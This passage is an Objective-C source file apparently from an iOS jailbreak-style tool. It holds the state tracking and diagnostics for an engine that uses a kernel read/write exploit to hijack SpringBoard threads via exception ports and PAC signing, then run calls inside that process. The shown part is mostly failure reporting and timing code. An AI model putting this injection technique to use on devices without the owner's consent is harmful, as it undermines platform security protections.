//
//  remote_call.m
//  Cyanide
//
//  Created by seo on 3/29/26.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <pthread.h>
#import <errno.h>
#import <sys/socket.h>
#import <sys/un.h>
#import <unistd.h>
#import <stdint.h>
#import <stdlib.h>
#import <string.h>

#import "RemoteCall.h"
#import "VPhoneDebug.h"
#import "VM.h"
#import "Exception.h"
#import "PAC.h"
#import "Thread.h"
#import "MigFilterBypassThread.h"
#import "../../kexploit/kexploit_opa334.h"
#import "../../kexploit/krw.h"
#import "../../kexploit/offsets.h"
#import "../../kexploit/kutils.h"
#import "../../kexploit/xpaci.h"
#import "../../utils/process.h"

extern bool gIsPACSupported;
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);

// xnu-10002.81.5/osfmk/kern/exc_guard.h
#define EXC_GUARD_ENCODE_TYPE(code, type) \
    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
#define EXC_GUARD_ENCODE_TARGET(code, target) \
    ((code) |= (((uint64_t)(target) & 0xffffffffull)))


// xnu-10002.81.5/osfmk/mach/arm/_structs.h
#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK 0xff000000
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8

// from pe_main.js
#define SHMEM_CACHE_SIZE                256
#define FAKE_PC_TROJAN_CREATOR          0x101
#define FAKE_LR_TROJAN_CREATOR          0x201
#define FAKE_PC_TROJAN                  0x301
#define FAKE_LR_TROJAN                  0x401

// xnu-10002.81.5/osfmk/kern/thread.h — also defined in Thread.m
#define TH_IN_MACH_EXCEPTION            0x8000

// from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
#define BREAKPOINT_ENABLE 481
#define BREAKPOINT_DISABLE 0

uint64_t g_RC_targetProcOverride = 0;
uint64_t g_RC_gadgetPacia = 0;

static pthread_mutex_t g_universal_ipc_mutex;
static pthread_once_t g_universal_ipc_mutex_once = PTHREAD_ONCE_INIT;

// Defined further down, next to the comment that explains what it means.
// Forward declared because the measurement block below reads it.
bool remote_call_runs_on_target_main_thread(void);

static void init_universal_mutex(void)
{
    pthread_mutexattr_t attr;
    pthread_mutexattr_init(&attr);
    pthread_mutexattr_settype(&attr, PTHREAD_MUTEX_RECURSIVE);
    pthread_mutex_init(&g_universal_ipc_mutex, &attr);
    pthread_mutexattr_destroy(&attr);
}

uint64_t do_remote_call_temp_internal(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
uint64_t do_remote_call_stable_addr_internal(int timeout, uint64_t pcAddr, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7);
bool remote_read_internal(uint64_t src, void *dst, uint64_t size);
bool remote_write_internal(uint64_t dst, const void *src, uint64_t size);
int destroy_remote_call_internal(void);
void abandon_remote_call_internal(void);

static __thread RemoteCallInitFailure g_RC_lastInitFailure = RemoteCallInitFailureNone;
static __thread uint32_t g_RC_lastInitFailurePid = 0;

// Which of the two waits in do_remote_call_temp_internal gave up on its last call:
// 1 is the first, waiting for the thread to be parked at a faulting PC, 2 is the
// second, waiting for it to come back from the function. 0 is neither, so the call
// failed somewhere else, in sign_state or in a rejected state.
//
// The init failure string for the bootstrap getpid used to guess between the two
// in prose, "0x101 miss / 0x201?", which is a hypothesis dressed as a diagnosis
// and is the only thing the app's own console had to say about a failure that
// decides whether the entire overlay exists. This is the measurement behind it.
// Which step of a temp call gave up on its last call.
//
//   1  the first wait, for the thread to be parked at a faulting PC
//   2  the second wait, for it to come back from the function
//   3  both waits completed, and the state that arrived was rejected as not live
//      enough to reply onto
//   4  both waits completed, and sign_state failed, which is remote_pac returning
//      0, which is the pacia signer not producing a result in time
//
// Values 3 and 4 were one bucket until the app console was asked to tell them
// apart and answered "state rejected or sign_state failed", which is the answer you
// get when the question had two halves and only one was asked. It had two halves
// because the PAC signer's internal wait and the target's exception wait are
// governed by completely different numbers, and the signer was the wrong one.
static __thread int g_RC_lastTempStep = 0;
// How many times the bootstrap getpid was tried before the init gave up. Zero for
// any other failure. Only exists so the failure can say how hard it tried.
static __thread int g_RC_bootstrapAttempts = 0;
// How many times the pacia signer produced nothing in time on this thread. Counted
// rather than merely recorded, because "the signer timed out once" and "the signer
// timed out on every attempt" are different bugs and only the count tells them
// apart. Read by remote_call_last_init_failure_detail.
__thread int g_RC_pacWaitTimeouts = 0;
__thread uint64_t g_RC_bootstrapPid = 0;
// Which branch of the synthetic call thread construction gave up.
//
//   1  pthread_create_suspended_np itself failed, or the call to it did
//   2  the create succeeded and no thread appeared in the thread list diff
//   3  a thread appeared but its address is not a kernel address
//   4  the thread is there and valid, and SpringBoard's own ipc_space holds no
//      port name for it, which the file already records as normal
//   5  the out pointer came back empty or as the canary, and no thread appeared
//   6  pthread_mach_thread_np failed
//   7  that gave a port, and resolving it to a kobject gave something that is not
//      a kernel address
//   8  no port at all, and there is no inject thread[1] to fall back to
//   9  no port at all, and thread[1] is invalid or is the signing thread itself
//  10  no target buffer to write the pthread_t into
//  11  the create was sent and did not come back from where a return comes from
//  12  the signature for the start routine could not be produced
//  13  the callee's symbol did not resolve, so the call was not sent at all
//  15  the reused thread's park could not be signed
//  16  the TRO-swap sequence that parks the reused thread failed
//
// Without this, "synthetic call thread kobject invalid" is one sentence for nine
// different failures, four of which are documented in this file as expected on some
// paths, and the console has no way to tell them apart. Read by
// remote_call_last_init_failure_detail.
// Set when the fresh-create path cannot be completed, so the thread[1] reuse below
// gets its turn instead of the session being destroyed.
//
// A create is an optimisation. It yields a brand new thread, which is the safest
// thing to hijack, so it stays first. But it is a call into another process's
// libsystem_pthreads with a caller-supplied out pointer, it has faulted
// deterministically, and every one of the ways it can fail used to end the whole
// session. SpringBoard has threads of its own a few entries down the list from the
// one being hijacked, this file already has a path that parks one of those at the
// same fake program counter behind the same exception port, and a working fallback
// is worth more than a create that dies.
//
// A flag rather than a goto, because the create block declares things that are still
// in scope after it and a jump into their initialisation is the kind of thing that
// compiles and then does something else.
static bool g_RC_createDead = false;
// Which path produced the call thread, for the failure report. "create", "reuse1" or
// empty, and empty means neither happened.
static const char *g_RC_callThreadPath = "";

// The definition of g_RC_callThreadStep, which the header declares extern because
// PAC.m increments it.
//
// It was lost, and the loss was invisible to every check in this repo. The line was
// replaced wholesale when the create-side flag went in above, so what remained was an
// extern declaration, a use, and no definition. That compiles perfectly under
// -fsyntax-only, which is all synall.sh and synapp.sh do, and only the linker sees it:
//
//   Undefined symbols for architecture arm64:
//     "_g_RC_callThreadStep", referenced from:
//       _remote_call_last_init_failure_detail in RemoteCall.m.435c9f27.o
//
// So a declaration and its definition are now checked against each other, which is
// the class of mistake no compile-only check can catch. See synapp.sh.
__thread int g_RC_callThreadStep = 0;
// The PC of whatever arrived on the port second, i.e. where the thread was when the
// call's "return" was delivered. A return is always the fake link register. Anything
// else is a fault raised inside the function, and its x0 is a register the function
// never set, which is a return value that means nothing.
//
// The raw value is kept as well as the stripped one because the whole point of the
// stripped one is the comparison, and a comparison that cannot be explained from the
// outside is not much of a measurement. Read by remote_call_last_init_failure_detail.
__thread uint64_t g_RC_lastTempRetPC = 0;
__thread uint64_t g_RC_lastTempRetPC_raw = 0;
// The type and code of whatever arrived on the port second, and x0 as it stood at
// the fault. A PC on its own says the thread was somewhere; these say what happened
// to it there, which is the difference between four bugs behind one line:
//
//   EXC_BAD_ACCESS read     the call was handed an address it cannot read
//   EXC_BAD_ACCESS write    the call was handed an address it cannot write
//   EXC_BAD_ACCESS execute  the thread jumped where it may not execute, which is
//                           what a signature that does not authenticate looks like
//   EXC_BAD_INSTRUCTION     an illegal instruction, which with authenticated
//                           pointers is a PAC failure and essentially nothing else
//   EXC_GUARD               not a fault at all: a thread guard tripping, so the
//                           port caught something that is not the call
__thread uint32_t g_RC_lastTempExcType = 0;
__thread uint64_t g_RC_lastTempExcCode = 0;
__thread uint64_t g_RC_lastTempX0 = 0;

typedef struct RemoteCallState {
    uint64_t taskAddr;
    bool creatingExtraThread;
    mach_port_t firstExceptionPort;
    mach_port_t secondExceptionPort;
    uint64_t firstExceptionPortAddr;
    uint64_t secondExceptionPortAddr;
    pthread_t dummyThread;
    mach_port_t dummyThreadMach;
    uint64_t dummyThreadAddr;
    uint64_t dummyThreadTro;
    uint64_t selfThreadAddr;
    uint32_t selfThreadCtid;
    arm_thread_state64_internal originalState;
    uint64_t vmMap;
    uint64_t callThreadAddr;
    uint64_t trojanThreadAddr;
    uint64_t mainThreadAddr;
    int pid;
    bool success;
    NSMutableArray<NSNumber *> *threadList;
    uint64_t trojanMem;
    struct VMShmem shmemCache[SHMEM_CACHE_SIZE];
    uint64_t shmemUseCounter[SHMEM_CACHE_SIZE];
    uint64_t shmemClock;
    uint64_t shmemEvictions;
    int firstExceptionTimeoutMS;
    int stableExceptionTimeoutFloorMS;
    bool originalThreadOnly;
    bool vphoneBridge;
} RemoteCallState;

static RemoteCallState g_RC_defaultState = { .success = true, .stableExceptionTimeoutFloorMS = 10000 };
static __thread RemoteCallState *g_RC_currentState;

@interface RemoteCallSession ()
- (RemoteCallState *)remoteCallStatePointer;
@end

static RemoteCallState *remote_call_current_state(void)
{
    if (!g_RC_currentState)
        g_RC_currentState = &g_RC_defaultState;
    return g_RC_currentState;
}

static RemoteCallState *remote_call_push_state(RemoteCallState *state)
{
    RemoteCallState *previous = remote_call_current_state();
    g_RC_currentState = state ?: &g_RC_defaultState;
    return previous;
}

static void remote_call_pop_state(RemoteCallState *previous)
{
    g_RC_currentState = previous ?: &g_RC_defaultState;
}

#define g_RC_taskAddr              (remote_call_current_state()->taskAddr)
#define g_RC_creatingExtraThread   (remote_call_current_state()->creatingExtraThread)
#define g_RC_firstExceptionPort    (remote_call_current_state()->firstExceptionPort)
#define g_RC_secondExceptionPort   (remote_call_current_state()->secondExceptionPort)
#define g_RC_firstExceptionPortAddr  (remote_call_current_state()->firstExceptionPortAddr)
#define g_RC_secondExceptionPortAddr (remote_call_current_state()->secondExceptionPortAddr)
#define g_RC_dummyThread           (remote_call_current_state()->dummyThread)
#define g_RC_dummyThreadMach       (remote_call_current_state()->dummyThreadMach)
#define g_RC_dummyThreadAddr       (remote_call_current_state()->dummyThreadAddr)
#define g_RC_dummyThreadTro        (remote_call_current_state()->dummyThreadTro)
#define g_RC_selfThreadAddr        (remote_call_current_state()->selfThreadAddr)
#define g_RC_selfThreadCtid        (remote_call_current_state()->selfThreadCtid)
#define g_RC_originalState         (remote_call_current_state()->originalState)
#define g_RC_vmMap                 (remote_call_current_state()->vmMap)
#define g_RC_callThreadAddr        (remote_call_current_state()->callThreadAddr)
#define g_RC_trojanThreadAddr      (remote_call_current_state()->trojanThreadAddr)
#define g_RC_mainThreadAddr        (remote_call_current_state()->mainThreadAddr)
#define g_RC_pid                   (remote_call_current_state()->pid)
#define g_RC_success               (remote_call_current_state()->success)
#define g_RC_threadList            (remote_call_current_state()->threadList)
#define g_RC_trojanMem             (remote_call_current_state()->trojanMem)
#define g_RC_shmemCache            (remote_call_current_state()->shmemCache)
#define g_RC_shmemUseCounter       (remote_call_current_state()->shmemUseCounter)
#define g_RC_shmemClock            (remote_call_current_state()->shmemClock)
#define g_RC_shmemEvictions        (remote_call_current_state()->shmemEvictions)
#define g_RC_firstExceptionTimeoutMS (remote_call_current_state()->firstExceptionTimeoutMS)
#define g_RC_stableExceptionTimeoutFloorMS (remote_call_current_state()->stableExceptionTimeoutFloorMS)
#define g_RC_originalThreadOnly      (remote_call_current_state()->originalThreadOnly)
#define g_RC_vphoneBridge            (remote_call_current_state()->vphoneBridge)

static void remote_call_note_init_failure(RemoteCallInitFailure failure, uint32_t pid)
{
    g_RC_lastInitFailure = failure;
    g_RC_lastInitFailurePid = pid;
}

RemoteCallInitFailure remote_call_last_init_failure(void)
{
    return g_RC_lastInitFailure;
}

uint32_t remote_call_last_init_failure_pid(void)
{
    return g_RC_lastInitFailurePid;
}

const char *remote_call_init_failure_description(RemoteCallInitFailure failure)
{
    switch (failure) {
        case RemoteCallInitFailureNone: return "none";
        case RemoteCallInitFailureKRWUnavailable: return "KRW unavailable";
        case RemoteCallInitFailureProcessMissing: return "process not found";
        case RemoteCallInitFailureInvalidTask: return "invalid task";
        case RemoteCallInitFailureExceptionPort: return "exception port setup failed";
        case RemoteCallInitFailureTaskGuard: return "task EXC_GUARD setup failed";
        case RemoteCallInitFailureLocalThread: return "local bootstrap thread setup failed";
        case RemoteCallInitFailureNoTargetThreads: return "no injectable target threads";
        case RemoteCallInitFailureFirstExceptionTimeout: return "target did not deliver bootstrap exception";
        // The two guesses that used to live here, "0x101 miss / 0x201?", were a
        // hypothesis with no measurement behind it, and they were the only thing the
        // app's console could say about a failure that decides whether the entire
        // overlay exists. The measurement is remote_call_last_init_failure_detail.
        case RemoteCallInitFailureBootstrapGetpid: return "bootstrap getpid failed";
        case RemoteCallInitFailurePthreadCreate: return "pthread_create_suspended_np / mach_thread failed";
        case RemoteCallInitFailureCallThread: return "synthetic call thread kobject invalid";
        case RemoteCallInitFailureThreadResume: return "thread_resume synthetic failed";
        case RemoteCallInitFailureFirstStableCall: return "first call on the call thread failed";
        case RemoteCallInitFailureRestoreOriginal: return "restore original after pthread failed";
        case RemoteCallInitFailureOther: return "other RemoteCall init failure";
    }
    return "unknown RemoteCall init failure";
}

// What actually happened, for the failures that have more than one way to happen.
//
// The app's console is the only place a person can read any of this, and it prints
// remote_call_init_failure_description and nothing else. That string is a pure
// function of the enum, so for a failure with a fork in it the fork was invisible
// and the string carried a guess instead.
//
// Built on demand into a thread-local buffer, from thread-local state, so there is
// nothing to keep in step at the point of failure. Callers print it; nothing logs
// it, because a caller that cannot print it has nowhere to put it.
// A fault in words, from the type and code the exception message already carries.
//
// The ARM_THREAD_STATE64 flavor has no fault address in it, so the address is not
// available and is not invented here. The type and the code are, and between them
// they name the fault: a bad access says whether the thread was reading, writing or
// executing, an illegal instruction means a signature did not authenticate, and a
// thread guard means the port caught something that is not a fault at all.
static const char *rc_exc_kind(char *buf, size_t n)
{
    if (g_RC_lastTempExcType == 0x241 || g_RC_lastTempExcType == 0x242) {
        snprintf(buf, n, "EXC_GUARD");
    } else if (g_RC_lastTempExcType == 2) {           // EXC_BAD_ACCESS
        const unsigned kind = (unsigned)(g_RC_lastTempExcCode & 0xff);
        const char *what = (kind == 1) ? "read" : (kind == 2) ? "write"
                        : (kind == 3) ? "execute" : "unknown";
        snprintf(buf, n, "EXC_BAD_ACCESS.%s code=0x%llx", what,
                 (unsigned long long)g_RC_lastTempExcCode);
    } else if (g_RC_lastTempExcType == 6) {           // EXC_BAD_INSTRUCTION
        snprintf(buf, n, "EXC_BAD_INSTRUCTION(pac) code=0x%llx",
                 (unsigned long long)g_RC_lastTempExcCode);
    } else if (g_RC_lastTempExcType == 1) {           // EXC_SOFTWARE
        snprintf(buf, n, "EXC_SOFTWARE code=0x%llx",
                 (unsigned long long)g_RC_lastTempExcCode);
    } else {
        snprintf(buf, n, "exc=%u code=0x%llx", g_RC_lastTempExcType,
                 (unsigned long long)g_RC_lastTempExcCode);
    }
    return buf;
}

const char *remote_call_last_init_failure_detail(void)
{
    static __thread char detail[224];
    static __thread char kind[64];
    if (g_RC_lastInitFailure == RemoteCallInitFailureBootstrapGetpid) {
        const char *step;
        switch (g_RC_lastTempStep) {
            // The thread was parked at a faulting PC by the creator reply and the trap
            // never arrived, or never arrived in time.
            case 1:  step = "wait1 no trap (thread never reached 0x101)"; break;
            // It ran, and the fault from returning into the fake link register never came
            // back, so the return value was never delivered.
            case 2:  step = "wait2 no return (RET to 0x201 never trapped)"; break;
            // Both waits completed, so the trap and the return both arrived, and the
            // state was refused because it was not live enough to reply onto.
            case 3:  step = "state rejected (not live enough to reply onto)"; break;
            // Both waits completed and the state was fine, and signing the pointer the
            // thread is about to run at did not produce a signature. This is the pacia
            // signer's own wait, inside remote_pac, and it is counted.
            case 4:  step = "sign_state failed (pacia signer returned nothing)"; break;
            // Both waits completed and the step was never set, which is the only way to
            // land here now: the call went out, ran, trapped on the way back, and the
            // engine has nothing left to complain about. Reaching the failure branch at
            // all in that state is a bug in whatever tested the return, not in the
            // engine, so the sentence says so rather than inventing a cause.
            default: step = "both waits completed (no step recorded)"; break;
        }
        snprintf(detail, sizeof(detail), "attempts=%d last=%s pacTimeouts=%d pid=%llu",
                 g_RC_bootstrapAttempts, step, g_RC_pacWaitTimeouts,
                 (unsigned long long)g_RC_bootstrapPid);
        return detail;
    }

    if (g_RC_lastInitFailure == RemoteCallInitFailureCallThread) {
        const char *step;
        switch (g_RC_callThreadStep) {
            case 1:  step = "pthread_create_suspended_np failed"; break;
            case 2:  step = "create ok, no new thread in list diff"; break;
            case 3:  step = "new thread addr not a kernel address"; break;
            case 4:  step = "no port name for the new thread in SB ipc_space"; break;
            case 5:  step = "out pointer empty or canary, and no new thread"; break;
            case 6:  step = "pthread_mach_thread_np failed"; break;
            case 7:  step = "port resolved to a non-kernel kobject"; break;
            case 8:  step = "no port and no inject thread[1] to reuse"; break;
            case 9:  step = "thread[1] invalid or is the signing thread"; break;
            case 10: step = "no target buffer for the out pointer"; break;
            case 11: step = "create faulted instead of returning"; break;
            default: step = "unclassified"; break;
        }
        snprintf(detail, sizeof(detail),
                 "callThread=%s path=%s retPC=0x%llx want=0x%llx %s x0=0x%llx",
                 step, g_RC_callThreadPath[0] ? g_RC_callThreadPath : "-",
                 (unsigned long long)g_RC_lastTempRetPC,
                 (unsigned long long)FAKE_LR_TROJAN_CREATOR,
                 rc_exc_kind(kind, sizeof(kind)),
                 (unsigned long long)g_RC_lastTempX0);
        return detail;
    }

    if (g_RC_lastInitFailure == RemoteCallInitFailurePthreadCreate) {
        const char *step;
        switch (g_RC_callThreadStep) {
            case 10: step = "no target buffer for the out pointer"; break;
            case 11: step = "create faulted instead of returning"; break;
            case 12: step = "start routine signature (remote_pac 0x301) failed"; break;
            case 13: step = "callee symbol did not resolve, call refused"; break;
            case 14: step = "could not park the fresh call thread"; break;
            case 15: step = "could not sign the reused thread's park"; break;
            case 16: step = "TRO-swap park of the reused thread failed"; break;
            case 19: step = "stable sign_state failed, no reply sent"; break;
            case 20: step = "stable wait1 gave up (no park trap)"; break;
            case 21: step = "stable wait2 gave up (never came back)"; break;
            default: step = "unclassified"; break;
        }
        snprintf(detail, sizeof(detail),
                 "callThread=%s path=%s retPC=0x%llx want=0x%llx %s x0=0x%llx",
                 step, g_RC_callThreadPath[0] ? g_RC_callThreadPath : "-",
                 (unsigned long long)g_RC_lastTempRetPC,
                 (unsigned long long)FAKE_LR_TROJAN_CREATOR,
                 rc_exc_kind(kind, sizeof(kind)),
                 (unsigned long long)g_RC_lastTempX0);
        return detail;
    }

    return "";
}

static bool remote_call_verbose_logging(void)
{
    const char *env = getenv("RC_VERBOSE");
    return env && env[0] && strcmp(env, "0") != 0;
}

// Monotonic microseconds for the RC_DIAG rate limiter. clock_gettime rather
// than mach_absolute_time, because the latter counts ticks and a one-second
// window built on ticks is a window of arbitrary length.
static uint64_t remote_call_diag_now_us(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000ULL + (uint64_t)ts.tv_nsec / 1000ULL;
}

// Measurement for the SpringBoard main-thread watchdog kill. Nothing here
// changes behaviour: it is two clock reads around a lock that is already
// taken, and a few counters.
//
// The device report for that kill says:
//     unresponsive dispatch queue(s): com.apple.main-thread
//     60 seconds since last successful checkin
//     thread 1562: turnstile blocked on task pid 850, hops: 2
// pid 850 is this app. A turnstile belongs to whoever owns the memory the
// mutex lives in, so "blocked on task pid 850" means a SpringBoard thread is
// waiting on a pthread mutex that lives in our address space. The only code
// of ours that a SpringBoard thread can reach is the code the hijack makes it
// execute, and the only lock on that path is g_universal_ipc_mutex.
//
// Two numbers distinguish the two candidate stories. holdMax is how long the
// target thread is kept inside our code by one call: if the trojan thread is
// the main thread, that is the main thread being held, and watchdogd kills at
// 60s of no checkin. waitMax is how long a thread of ours sat blocked on the
// same mutex, which is the turnstile in the report: a wait that grows without
// bound is the deadlock, a wait that stays flat is only queueing.
static uint64_t g_rcIpcCalls = 0;
static uint64_t g_rcIpcHoldMaxUS = 0;
static uint64_t g_rcIpcHoldTotalUS = 0;
static uint64_t g_rcIpcWaitMaxUS = 0;
static uint64_t g_rcIpcWaitSlow = 0;      // waits of 1ms or more
static uint32_t g_rcIpcLastHolderTid = 0;
static uint32_t g_rcIpcLastWaiterTid = 0;

// Which call hangs, and for how long. The measured shape of the freeze is one
// call that holds the mutex until the stable-exception timeout, which is
// g_RC_stableExceptionTimeoutFloorMS = 10000ms, and holdmax landing on 10063ms
// is that timeout, not a coincidence. Which symbol is stuck is what says
// whether the hang is in the path build, in the path draw, or in the
// housekeeping around them, and those three have nothing in common.
//
// 500ms is the threshold because a healthy call is under 10ms here, so a half
// second is already two orders of magnitude out and cannot fire on noise. Only
// the slowest name is kept, because a flood of names is not the question: the
// question is which one call can sit there for ten seconds.
#define RC_SLOW_CALL_US 500000ULL
#define RC_SLOW_NAME_MAX 64
static char g_rcSlowName[RC_SLOW_NAME_MAX] = {0};
static uint64_t g_rcSlowMaxUS = 0;
static uint64_t g_rcSlowCount = 0;
static uint32_t g_rcSlowTid = 0;

static inline uint32_t rc_ipc_tid(void)
{
    return (uint32_t)pthread_mach_thread_np(pthread_self());
}

static inline uint64_t rc_ipc_lock_measuring(uint64_t *waitOut)
{
    const uint64_t t0 = remote_call_diag_now_us();
    pthread_mutex_lock(&g_universal_ipc_mutex);
    const uint64_t t1 = remote_call_diag_now_us();
    const uint64_t waited = t1 - t0;
    *waitOut = waited;
    if (waited > g_rcIpcWaitMaxUS) {
        g_rcIpcWaitMaxUS = waited;
        g_rcIpcLastWaiterTid = rc_ipc_tid();
    }
    if (waited >= 1000ULL) g_rcIpcWaitSlow++;
    return t1;
}

static inline void rc_ipc_unlock_measuring(uint64_t t1, const char *name)
{
    const uint64_t held = remote_call_diag_now_us() - t1;
    g_rcIpcCalls++;
    g_rcIpcHoldTotalUS += held;
    if (held > g_rcIpcHoldMaxUS) g_rcIpcHoldMaxUS = held;
    g_rcIpcLastHolderTid = rc_ipc_tid();
    if (held >= RC_SLOW_CALL_US) {
        g_rcSlowCount++;
        if (held > g_rcSlowMaxUS) g_rcSlowMaxUS = held;
        g_rcSlowTid = g_rcIpcLastHolderTid;
        if (name) {
            strncpy(g_rcSlowName, name, RC_SLOW_NAME_MAX - 1);
            g_rcSlowName[RC_SLOW_NAME_MAX - 1] = '\0';
        } else {
            g_rcSlowName[0] = '\0';
        }
        // Logged at the moment it happens, not only in the heartbeat: the hang
        // is what kills the session, and a session that is dying may never
        // reach another heartbeat line.
        NSLog(@"[RC-SLOW] call=%s held=%llums tid=%u slowcount=%llu",
              name ?: "(null)", (unsigned long long)(held / 1000ULL),
              (unsigned)g_rcIpcLastHolderTid, (unsigned long long)g_rcSlowCount);
    }
    pthread_mutex_unlock(&g_universal_ipc_mutex);
}

const char *remote_call_slowest_call_name(void)
{
    return g_rcSlowName[0] ? g_rcSlowName : "(none)";
}

// Which of the two waits ate the time.
//
// A call parks a synthetic thread in an exception, hands it the function to
// run, then waits for the thread to come back with the result. That is two
// waits, and a 10 second hold is one of them hitting newTimeout, which is
// g_RC_stableExceptionTimeoutFloorMS. The symbol is not the cause of the wait:
// the device log shows objc_msgSend and malloc both holding for ten seconds,
// and malloc never touches objc or a main thread, so what is common to them is
// the transport, not the callee.
//
// wait1 timing out means the thread never picked up the call at all: the
// session is dead before any work is done. wait2 timing out means it took the
// call and never came back, which is a wedged or descheduled thread. Those
// two have different fixes, so which one it is has to be measured rather than
// guessed from the symbol name.
static uint64_t g_rcWait1US = 0;
static uint64_t g_rcWait2US = 0;
static uint64_t g_rcWait1TO = 0;
static uint64_t g_rcWait2TO = 0;
static uint64_t g_rcWait1MaxUS = 0;
static uint64_t g_rcWait2MaxUS = 0;
// 0 = no wait2 timeout yet, 1 = init released its borrowed threads,
// 2 = it did not.
static int g_rcW2Stray = 0;
// Identity of the thread that was replied to. Reported on a wait2 timeout so
// the thread that took the work is named even though the one that faulted is
// not reachable from here.
static uint32_t g_rcW1Sender = 0;
static uint64_t g_rcW1Pc = 0;
// How many threads init borrowed, gave back, and kept as the call thread. The
// release is the fix, so its result has to be visible: a timeout with
// released=0 means the fix did not take rather than that something else broke.
static uint64_t g_rcBorrowedTotal = 0;
static uint64_t g_rcBorrowedReleased = 0;
static uint64_t g_rcBorrowedKept = 0;

void remote_call_wait_split_diag(uint64_t *wait1US, uint64_t *wait2US,
                                 uint64_t *wait1TO, uint64_t *wait2TO,
                                 uint64_t *wait1MaxUS, uint64_t *wait2MaxUS,
                                 int *w2stray, uint32_t *w1sender, uint64_t *w1pc,
                                 uint64_t *borrowed, uint64_t *released,
                                 uint64_t *kept)
{
    if (wait1US)    *wait1US = g_rcWait1US;
    if (wait2US)    *wait2US = g_rcWait2US;
    if (wait1TO)    *wait1TO = g_rcWait1TO;
    if (wait2TO)    *wait2TO = g_rcWait2TO;
    if (wait1MaxUS) *wait1MaxUS = g_rcWait1MaxUS;
    if (wait2MaxUS) *wait2MaxUS = g_rcWait2MaxUS;
    if (w2stray)    *w2stray = g_rcW2Stray;
    if (w1sender)   *w1sender = g_rcW1Sender;
    if (w1pc)       *w1pc = g_rcW1Pc;
    if (borrowed)   *borrowed = g_rcBorrowedTotal;
    if (released)   *released = g_rcBorrowedReleased;
    if (kept)       *kept = g_rcBorrowedKept;
}

void remote_call_slowest_call(uint64_t *maxUS, uint64_t *count, uint32_t *tid)
{
    if (maxUS) *maxUS = g_rcSlowMaxUS;
    if (count) *count = g_rcSlowCount;
    if (tid)   *tid = g_rcSlowTid;
}

void remote_call_main_thread_diag(uint64_t *onMain, uint64_t *holdMaxUS,
                                 uint64_t *holdTotalUS, uint64_t *waitMaxUS,
                                 uint64_t *waitSlow, uint64_t *calls,
                                 uint32_t *lastHolderTid, uint32_t *lastWaiterTid)
{
    if (onMain)        *onMain = remote_call_runs_on_target_main_thread() ? 1 : 0;
    if (holdMaxUS)     *holdMaxUS = g_rcIpcHoldMaxUS;
    if (holdTotalUS)   *holdTotalUS = g_rcIpcHoldTotalUS;
    if (waitMaxUS)     *waitMaxUS = g_rcIpcWaitMaxUS;
    if (waitSlow)      *waitSlow = g_rcIpcWaitSlow;
    if (calls)         *calls = g_rcIpcCalls;
    if (lastHolderTid) *lastHolderTid = g_rcIpcLastHolderTid;
    if (lastWaiterTid) *lastWaiterTid = g_rcIpcLastWaiterTid;
}

#define RC_DEBUG(...) do { if (remote_call_verbose_logging()) printf(__VA_ARGS__); } while (0)
//
// 3uTools Realtime Log catches NSLog; plain printf is often invisible there.
//
// Rate limited to one line per second, and that is the whole point of the
// macro. Four RC_DIAG fire on the success path of every single remote call
// (RemoteCall.m:1209, 1216, 1256, 1267), and they fire from inside
// do_remote_call_stable_addr_internal, which means they fire while
// g_universal_ipc_mutex and gRemoteCallLock are both held. An NSLog is an
// os_log IPC to logd, so one publish of fifty calls was two hundred logd
// round trips, each one inside the lock that every other call is queued behind.
//
// That is the measured shape of the freeze. A remote call costs about
// 0.25 ms when logd is keeping up and 4.4 ms when it is not, with no change
// in the work between them, and a realtime log consumer attached is exactly
// what makes the slow case the common one. Fifty calls at 4.4 ms is 220 ms,
// which is the 218 ms publish the device log recorded.
//
// RC_VERBOSE=1 restores every line, so nothing is lost for a deliberate
// capture. The default is one line a second, which is the rate everything
// else in this project already logs at and is enough to see that a session
// is alive or that a specific call keeps failing.
#define RC_DIAG(fmt, ...) do { \
        if (remote_call_verbose_logging()) { \
            char _rc_diag_buf[1024]; \
            snprintf(_rc_diag_buf, sizeof(_rc_diag_buf), "[RemoteCall] DIAG " fmt, ##__VA_ARGS__); \
            NSLog(@"%s", _rc_diag_buf); \
        } else { \
            static uint64_t _rc_diag_last = 0; \
            uint64_t _rc_diag_now = remote_call_diag_now_us(); \
            if (_rc_diag_last == 0 || _rc_diag_now - _rc_diag_last >= 1000000ULL) { \
                _rc_diag_last = _rc_diag_now; \
                char _rc_diag_buf[1024]; \
                snprintf(_rc_diag_buf, sizeof(_rc_diag_buf), "[RemoteCall] DIAG " fmt, ##__VA_ARGS__); \
                NSLog(@"%s", _rc_diag_buf); \
            } \
        } \
    } while (0)

static bool remote_call_should_log_result(const char *name, bool stable)
{
    if (remote_call_verbose_logging())
        return true;

    if (!name)
        return true;

    static const char *quietSymbols[] = {
        "malloc",
        "free",
        "objc_msgSend",
        "objc_msgSendSuper",
        "objc_msgSendSuper2",
        "sel_registerName",
        "sel_getUid",
        "objc_getClass",
        "objc_lookUpClass",
        "objc_allocateClassPair",
        "object_getClass",
        "object_getClassName",
        "class_getName",
        "class_getSuperclass",
        "class_getInstanceMethod",
        "class_getClassMethod",
        "class_getInstanceVariable",
        "class_getInstanceSize",
        "class_respondsToSelector",
        "method_getTypeEncoding",
        "method_getName",
        "method_getImplementation",
        "ivar_getOffset",
        "ivar_getName",
        "ivar_getTypeEncoding",
        "strdup",
        "strcmp",
        "strlen",
        "memcpy",
        "memcmp",
        "CFStringCreateWithCString",
